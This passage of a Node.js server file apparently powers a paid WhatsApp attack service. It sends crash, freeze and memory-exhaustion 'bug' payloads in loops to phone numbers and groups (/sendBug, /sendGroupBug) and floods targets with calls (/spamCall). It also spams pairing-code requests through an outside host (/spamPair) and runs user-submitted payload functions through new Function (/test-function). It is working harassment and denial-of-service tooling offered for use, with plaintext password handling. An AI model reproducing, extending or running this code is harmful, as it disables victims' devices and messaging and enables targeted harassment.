        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { 
      username, 
      lastLogin: stamp, 
      sessionKey: key, 
      ipAddress: ip, 
      androidId,
      role: role || 'member'
    };
  } else {
    list.push({ 
      username, 
      lastLogin: stamp, 
      sessionKey: key, 
      ipAddress: ip, 
      androidId,
      role: role || 'member'
    });
  }

  saveKeyList(list);
  
  activeKeys[key] = {
    username: username,
    role: role || 'member',
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000
  };
  
  console.log(`[🔑 KEY] Session key disimpan untuk ${username}: ${key}`);
}

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(File_Log, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const userIdx = db.findIndex(u => u.username === username && u.password === password);
  const user = db[userIdx];

  if (!user) return res.json({ valid: false });
  
  if (!user.pairId) {
    user.pairId = genPairId();
    db[userIdx] = user;
    saveDatabase(db);
  }

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid && oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  
  activeKeys[key] = {
    username,
    role: user.role || 'member',
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listGb: bugsgb,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    listGb: bugsgb,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});
async function cekWa(sock, target) {
    try {
        const jid = target.includes('@') ? target : target + '@s.whatsapp.net';
        const result = await sock.onWhatsApp(jid);
        
        if (result && result.length > 0) {
            const info = result[0];
            return {
                exists: true,
                jid: info.jid,
                verified: info.verified || false,
                biz: info.biz || false
            };
        } else {
            return {
                exists: false,
                message: 'Nomor tidak terdaftar di WhatsApp'
            };
        }
    } catch (e) {
        return {
            exists: false,
            error: e.message
        };
    }
}
app.get("/sendGroupBug", async (req, res) => {
  const { key, gb } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  console.log(`[📤] target=${target} | gb=${gb} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);
  
  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "buggroup",
      `Kirim Bug Group: ${gb.toUpperCase()}`,
      `Target Group: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;
    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);
    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'library', 'vip');
      const userPath = path.join(__dirname, 'library', 'user', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getSWhatsappAktif(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getSWhatsappAktif(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);
    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";
        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          let groupInfo = await sock.groupGetInviteInfo(inviteCode);
          targetJid = groupInfo.id;
          try { await sock.groupAcceptInvite(inviteCode); } catch {}
        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@g.us";
        }

        console.log(`[🎯] JID Group: ${targetJid}`);

       switch (gb) {
        case "freezegb":
         for (let i = 0; i < 170; i++) {
           await PayX(sock, targetJid);
           await StcX(sock,targetJid);
          }
          break;
        case "trashgb":
         for (let i = 0; i < 170; i++) {
           await BuggsGb(sock, targetJid);
           await BuggsGb2(sock,targetJid);
           await sleep(2000);
          }
          break;
        case "zazaza":
         for (let i = 0; i < 1; i++) {
           await groupBan(sock, targetJid);
          }
          break;
          default:
          console.warn(`[⚠️] gb '${gb}' tidak dikenal`);
         }

        console.log(`[✅] '${gb}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌] Gagal kirim '${gb}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});
app.get("/spamCall", async (req, res) => {
    const { key, target, qty } = req.query;

    const username = await getUserByKey(key, req);
    if (!username) return res.json({ valid: false });

    const db = loadDatabase();
    const user = db.find(u => u.username && u.username.trim().toLowerCase() === username.trim().toLowerCase());
    if (blockReview(user, res)) return;
    const role = normalizeRoleKey(user?.role);
    if (!user || !["member", "reseller", "admin", "patner", "owner", "moderator", "staf"].includes(role)) {
        return res.json({ valid: false, message: "Access denied" });
    }

    const maxQty = role === "staf" ? 10 : 5;
    const callQty = parseInt(qty) || 1;

    if (callQty > maxQty) {
        return res.json({
            valid: false,
            message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
        });
    }

    const bizKeys = Object.keys(activeConnections);
    if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

    const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

    const now = Date.now();
    const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

    if (now - cooldown.lastReset > 300_000) {
        cooldown.count = 0;
        cooldown.lastReset = now;
    }

    if (cooldown.count >= 5) {
        const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
        return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
    }

    try {

        const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
        const sock = biz[socketId];

        await sock.updateBlockStatus(jid, "unblock");

        await sock.offerCall(jid, true);
        await sock.updateBlockStatus(jid, "block");
        console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

        cooldown.count++;
        spamCooldown[user.username] = cooldown;

        res.json({ valid: true, sended: true, total: callQty });

        for (let i = 1; i < callQty; i++) {
            setTimeout(async () => {
                try {
                    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
                    const sock = biz[socketId];

                    await sock.updateBlockStatus(jid, "unblock");

                    await sock.offerCall(jid, true);

                    await sock.updateBlockStatus(jid, "block");

                    console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
                } catch (err) {
                    console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
                }
            }, i * 10000);
        }
    } catch (err) {
        console.warn("[❌ FIRST CALL ERROR]", err.message);
        return res.json({ valid: false, message: "Call failed" });
    }
});
const DIGIT_RE = /\d{6,16}/g;

function sanitizeUserFunction(src) {
    if (typeof src !== "string") return src;
    return src.replace(/\bchalk\.(\w+)\s*\(/g, "console.log(");
}

function normalizeUserFunction(src) {
    if (typeof src !== "string") return src;

    let out = src;

    out = out.replace(/\bchalk\.(\w+)\s*\(/g, "console.log(");
    out = out.replace(/\b(await\s+)?(sock|socket|conn)\./g, "$1sock.");

    out = out.replace(
        /(async\s+function\s*\w*\s*)\(([^)]*)\)/g,
        (full, head, params) => {
            const p = params.split(",").map(s => s.trim()).filter(Boolean);

            if (p.length === 1 && p[0] === "target") {
                return `${head}(sock, target)`;
            }

            if (
                p.length === 2 &&
                ["sock", "socket", "conn"].includes(p[0]) &&
                p[1] === "target"
            ) {
                return `${head}(sock, target)`;
            }

            return full;
        }
    );

    out = out.replace(
        /(async\s*)?\(([^)]*)\)\s*=>/g,
        (full, asyncPart, params) => {
            const p = params.split(",").map(s => s.trim()).filter(Boolean);

            if (p.length === 1 && p[0] === "target") {
                return `${asyncPart || ""}(sock, target) =>`;
            }

            if (
                p.length === 2 &&
                ["sock", "socket", "conn"].includes(p[0]) &&
                p[1] === "target"
            ) {
                return `${asyncPart || ""}(sock, target) =>`;
            }

            return full;
        }
    );

    return out;
}

const parseTargets = s =>
    Array.from(
        new Set(
            (s?.match(DIGIT_RE) || [])
                .map(n => n.replace(/\D/g, ""))
                .filter(Boolean)
        )
    );

const toJid = num => {
    if (!num) return null;
    if (num.includes("@")) return num;
    return `${num}@s.whatsapp.net`;
};

const tempFuncLog = [];
const testFunctionNted = new Map();

async function ConnectUlang(FolderNted) {
const lockKey = String(FolderNted || '').trim();
   if (!lockKey) return null;

const previous = testFunctionNted.get(lockKey) || Promise.resolve();
    const current = previous.catch(() => { }).then(async () => {
        const folderPath = path.join(process.cwd(), 'sockayun', lockKey);
        if (!fs.existsSync(folderPath)) return null;

        try {
            const entries = fs.readdirSync(folderPath);
            for (const entry of entries) {
                const entryPath = path.join(folderPath, entry);
                const sessionName = entry.endsWith('.json') ? path.basename(entry, '.json') : entry;

                let usable = entry.endsWith('.json');
                try {
                    usable = usable || (fs.statSync(entryPath).isDirectory() && fs.existsSync(path.join(entryPath, 'creds.json')));
                } catch (_) { }

                if (!usable) continue;

                if (typeof killExistingSession === 'function') {
                    killExistingSession(sessionName);
                } else {
                    try { activeConnections[sessionName]?.ws?.close?.(); } catch (_) { }
                    delete activeConnections[sessionName];
                    delete biz[sessionName];
                    delete mess[sessionName];
                }
            }
        } catch (err) {
            console.error('[TEST-FUNCTION] Gagal reset socket sebelum reconnect:', err.message);
        }

        await sleep(800);
        return checkActiveSessionInFolder(lockKey);
    });

    testFunctionNted.set(lockKey, current);
    try {
        return await current;
    } finally {
        if (testFunctionNted.get(lockKey) === current) {
            testFunctionNted.delete(lockKey);
        }
    }
}

class MemoryQueue {
    constructor(concurrency) {
        this.concurrency = concurrency;
        this.running = 0;
        this.queue = [];
    }
    async enqueue(task) {
        if (this.running >= this.concurrency) {
            await new Promise(resolve => this.queue.push(resolve));
        }
        this.running++;
        try { return await task(); }
        catch (err) { console.error("MemoryQueue Error:", err.message); }
        finally {
            this.running--;
            if (this.queue.length > 0) {
                const next = this.queue.shift();
                next();
            }
        }
    }
}

const testFunctionQueue = new MemoryQueue(15);

async function ProsesTestFunc(jobData) {
    const { username, targets, func, delay, loops, logId } = jobData;
    console.log(`\n[TEST-FUNCTION] 🚀 Start job untuk ${username}`);

    try {
        const sock = await ConnectUlang(username);
        if (!sock) throw new Error("Session tidak ditemukan");

        const execFn = toFunction(func);
        if (!execFn) throw new Error("Source is not a function / syntax error");

        const ctx = {
            generateWAMessageFromContent,
            generateWAMessage,
            prepareWAMessageMedia,
            relayWAMessage,
            proto,
            sleep,
            crypto
        };

        const logEntry = tempFuncLog.find(l => l.id === logId);
        if (logEntry) logEntry.status = "running";

        for (const jid of targets) {
            for (let i = 0; i < loops; i++) {
                try {
                    await execFn(sock, jid, ctx);
                } catch (err) {
                    console.error("EXEC ERROR", jid, err.message);
                }

                if (delay > 0 && i < loops - 1) {
                    await sleep(delay);
                }
            }
        }
    } catch (err) {
        console.error("ERROR in Worker", username, err.message);
    } finally {
        const idx = tempFuncLog.findIndex(l => l.id === logId);
        if (idx !== -1) tempFuncLog.splice(idx, 1);
    }
}

app.post("/test-function", async (req, res) => {
    const { key, target, function: func, delay = 220, loops = 1 } = req.body;

    const rawTargets = parseTargets(target);
    if (!key || !func || !rawTargets.length) {
        return res.json({ success: false, message: "Data tidak lengkap" });
    }

    const targets = rawTargets
        .map(toJid)
        .filter(jid => typeof jid === "string" && jid.endsWith("@s.whatsapp.net"));

    if (!targets.length) {
        return res.json({ success: false, message: "Target tidak valid" });
    }

    reloadActiveKeys();
    const keyInfo = activeKeys[key];
    if (!keyInfo) {
        return res.json({ success: false, message: "Key tidak valid" });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);
    if (!user) {
        return res.json({ success: false, message: "User tidak ditemukan" });
    }

    const routeMismatch = getRouteMismatchPayload(user, req);
    if (routeMismatch) {
        return res.json({ success: false, cooldown: false, ...routeMismatch });
    }

    user.role ??= "FULLUP";
    const role = normalizeRoleKey(user.role);

    const roleCooldowns = {
        member: 200,
        FULLUP: 200,
        RESELLER: 160,
        PT: 100,
        TK: 60,
        OWNER: 0,
        KINGZ: 0
    };

    const cooldown = roleCooldowns[role] ?? 60;
    const now = Date.now();
    user.lastSend ??= 0;
    const diff = Math.floor((now - user.lastSend) / 1000);
    if (diff < cooldown) {
        return res.json({
            success: false,
            cooldown: true,
            wait: cooldown - diff,
            role,
            message: "Masih cooldown"
        });
    }

    user.lastSend = now;
    saveDatabase(db);

    let execFn;
    try {
        execFn = toFunction(func);
        if (!execFn) throw new Error("Source is not a function / syntax error");
    } catch (err) {
        return res.json({ success: false, message: "Syntax error: " + err.message });
    }

    const logEntry = {
        id: now,
        username: user.username,
        role,
        targets,
        delay,
        loops,
        status: "pending",
        time: now
    };

    tempFuncLog.push(logEntry);

    res.json({
        success: true,
        message: "Function diterima & diproses",
        role,
        targets,
        logId: now
    });


    testFunctionQueue.enqueue(() => ProsesTestFunc({
        username: user.username,
        targets,
        func,
        delay,
        loops,
        logId: now
    }));
});

const toFunction = src => {
    try {
        const safeSrc = normalizeUserFunction(src);

        return new Function(
            "sock",
            "target",
            "ctx",
            `"use strict";
       const {
         generateWAMessageFromContent,
         generateWAMessage,
         prepareWAMessageMedia,
         relayWAMessage,
         proto,
         sleep,
         crypto
       } = ctx;
       const { randomBytes } = crypto;

       const fn = (${safeSrc});
       if (typeof fn !== "function")
         throw new Error("Source is not a function");

       return fn(sock, target, ctx);
      `
        );
    } catch (e) {
        console.error('[CUSTOM PAYLOAD EXEC]', e.message);
        return null;
    }
};
app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { member: 250, reseller: 290, admin: 60, vip: 10, owner: 1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    if (senderMode === 'global') {
      const entries = Object.entries(activeConnections);
      if (entries.length === 0) {
        console.warn(`[❌] Global: tidak ada koneksi aktif.`);
        return;
      }
      sock = entries[Math.floor(Math.random() * entries.length)][1];
      console.log(`[🌍] Global sender. Total aktif: ${entries.length}`);

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, '/library', 'vip');
      const userPath = path.join(__dirname, 'library', 'user', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getSWhatsappAktif(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getSWhatsappAktif(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

      let bugType = bug;
     
       if (senderMode === 'global') {
         if (bug === 'crasher') bugType = 'trash';
         if (bug === 'delay') bugType = 'dslow';
         if (bug === 'comboz') bugType = 'bapalu';
         if (bug === 'delayx') bugType = 'xxxxone';
       }
         switch (bugType) {
          case "trash":
            for (let i = 0; i < 170; i++) {
             await sqlMemory2(sock, targetJid);
             await sqlMemory3(sock,targetJid);
             await TrashWazap(sock,targetJid);
             await sleep(2000)
            }
            break;
          case "bugss":
            for (let i = 0; i < 170; i++) {
             await BugWaxap(sock, targetJid);
             await FreezeToCrash(sock,targetJid);
             await FreezeToCrash2(sock,targetJid);
            }
            break;
          case "clbug":
            for (let i = 0; i < 100; i++) { 
             await chatlock(sock, targetJid); 
             await FreezeChat(sock, targetJid);
             await TrashWazap(sock,targetJid);
            }
            break;
          case "fbug":
            for (let i = 0; i < 150; i++) {
             await PayX(sock, targetJid);
             await freezechat(sock, targetJid);
            }
            break;
          case "dslow":
            for (let i = 0; i < 150; i++) {
             await convQtd(sock, targetJid);
             await annotationz(sock, targetJid);
             await TrashWazap(sock, targetJid);
             await invisOOM2(sock, targetJid);
             }
           break;
          case "bapalu":
            for (let i = 0; i < 150; i++) {
             await InvisibleX(sock, targetJid);
             await ofmEr(sock, targetJid);
             await OfmSqLJav(sock, targetJid);
             await oombimg(sock, targetJid);
             await invisOOM2(sock, targetJid);
             }
           break;
          case "xxxxone":
            for (let i = 0; i < 150; i++) {
             await sqlMemory3(sock, targetJid);
             await TrashWazap(sock, targetJid);
             await convQtd(sock, targetJid);
             await invisOOM(sock, targetJid);
             await invisOOM2(sock, targetJid);
             await annotationz(sock, targetJid);
             }
           break;
          case "oom":
            for (let i = 0; i < 100; i++) {
            await annotationz(sock, targetJid);
            await invisOOM(sock, targetJid);
            await invisOOM2(sock, targetJid);
           }
           break;
          case "cios":
            for (let i = 0; i < 100; i++) {
            await iozk(sock, targetJid);
            }
           break;
          case "vokep":
            for (let i = 0; i < 100; i++) {
            await SpamVokep(sock, targetJid);
            }
           break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'library', 'vip');
            const userPath = path.join(__dirname, 'library', 'user', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getSWhatsappAktif(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getSWhatsappAktif(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

app.get("/spamPair", async (req, res) => {
  const { key, number, count = 1 } = req.query;

  console.log(`[📤] SpamPair | target=${number} | count=${count}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ 
      valid: false, 
      message: 'Session key tidak valid' 
    });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    return res.json({ 
      valid: false, 
      message: 'User tidak ditemukan' 
    });
  }
  if (!number) {
    return res.json({
      valid: false,
      message: 'Nomor target diperlukan'
    });
  }

  let formattedNumber = number.replace(/\D/g, '');
  if (!formattedNumber.startsWith('62') && !formattedNumber.startsWith('+')) {
    formattedNumber = '62' + formattedNumber;
  }
  if (!formattedNumber.startsWith('+')) {
    formattedNumber = '+' + formattedNumber;
  }

  let requestCount = parseInt(count);
  if (isNaN(requestCount) || requestCount < 1) {
    requestCount = 1;
  }
  if (requestCount > 100) {
    return res.json({
      valid: false,
      message: 'Maksimal 100 request per sesi'
    });
  }

  const role = user.role || "member";
  const cooldownSeconds = 30;
  if (!user.lastSpamPair) user.lastSpamPair = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSpamPair) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
      message: `Cooldown aktif. Tunggu ${cooldownSeconds - diffSeconds} detik`
    });
  }

  user.lastSpamPair = now;
  saveDatabase(db);
  
  res.json({ 
    valid: true, 
    success: true,
    message: 'Spam pairing dimulai...'
  });

  setImmediate(async () => {
    saveUserLog(user.username, "spampair",
      `Spam Pairing`,
      `Target: ${number} | Count: ${requestCount}`
    );

    let successCount = 0;
    let failedCount = 0;
    const results = [];

    for (let i = 1; i <= requestCount; i++) {
      try {
        const url = `https://pair.subzero.gleeze.com/code?number=${formattedNumber}`;
        
        const response = await fetch(url);
        
        if (response.ok) {
          successCount++;
          console.log(`[✅] [${i}/${requestCount}] Spam pairing success [TFX-TEAM]`);
          results.push({
            attempt: i,
            success: true,
            message: `[${i}/${requestCount}] Spam pairing success [TFX-TEAM]`
          });
        } else {
          failedCount++;
          console.log(`[❌] [${i}/${requestCount}] HTTP ${response.status}`);
          results.push({
            attempt: i,
            success: false,
            message: `[${i}/${requestCount}] HTTP ${response.status}`
          });
        }
      } catch (err) {
        failedCount++;
        console.log(`[❌] [${i}/${requestCount}] ${err.message}`);
        results.push({
          attempt: i,
          success: false,
          message: `[${i}/${requestCount}] ${err.message}`
        });
      }

      if (i < requestCount) {
        await sleep(500);
      }
    }

    console.log(`[📊] SpamPair selesai | Berhasil: ${successCount} | Gagal: ${failedCount}`);
    
    saveUserLog(user.username, "spampair_result",
      `Hasil Spam Pairing`,
      `Target: ${number} | Berhasil: ${successCount} | Gagal: ${failedCount}`
    );
  });
});

function FolderinActive(FolderNted) {
  const folderPath = path.join('library', FolderNted);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}
app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  if (!['owner', 'vip','admin'].includes(user.role)) {
    return res.json({ valid: false, senders: [] });
  }

  const senders = Object.keys(activeConnections);
  res.json({ valid: true, senders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'library';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
